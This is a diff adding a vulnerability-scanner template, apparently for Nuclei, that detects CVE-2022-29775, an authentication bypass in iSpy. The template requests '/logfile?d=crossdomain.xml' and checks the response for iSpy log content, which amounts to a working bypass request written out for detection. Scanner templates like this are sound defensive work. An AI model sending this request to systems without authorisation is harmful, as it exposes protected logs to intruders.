@@ -1,0 +1,25 @@
+id: cve-2022-29775
+info:
+  name: iSpy crossdomain.xml Authentication Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2022-29775,authentication-bypass
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/logfile?d=crossdomain.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "iSpy"
+          - "Log Start"
+          - "Log File"
+      - type: word
+        part: header
+        words:
+          - "text/html"
